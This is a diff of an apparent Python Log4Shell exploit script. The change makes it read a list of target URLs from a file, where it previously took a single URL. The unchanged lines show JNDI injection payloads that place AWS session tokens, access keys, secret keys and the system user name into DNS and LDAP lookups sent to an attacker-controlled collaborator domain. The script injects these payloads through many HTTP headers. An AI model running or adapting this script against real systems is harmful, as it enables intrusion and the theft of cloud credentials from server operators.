@@ -11,14 +11,19 @@ from requests.packages import urllib3
 from urllib3 import disable_warnings
 disable_warnings()
 from requests_toolbelt.utils import dump
+import feedparser # pip install feedparser
+import re
+
 #coded_by_DorkerDevil
+
 target = sys.argv[1]
-ssrf = sys.argv[2]
+ssrf = sys.argv[2] 
 
 S = 10
 ran = ''.join(random.choices(string.ascii_uppercase + string.digits,
               k=S))
 collab = str(ran) + '.' + ssrf
+
 list = [
     'Referer',
 'X-Api-Version',
@@ -100,7 +105,12 @@ paload = \
      ,
      '${jndi:dns://${env:AWS_SESSION_TOKEN }.${env:AWS_ACCESS_KEY_ID}.${env:AWS_SECRET_ACCESS_KEY}.'
       + collab + '/a}', '${jndi:ldap://${sys:user.name}.'+collab+'}']
-url = target + '/'
+
+with open(target, "r", encoding='utf-8') as fd:
+    for i in fd.readlines():
+        url = i.strip()
+        if url == "" or url.startswith("#"):
+            continue
 
 for headerz in list:
     for pay in paload:
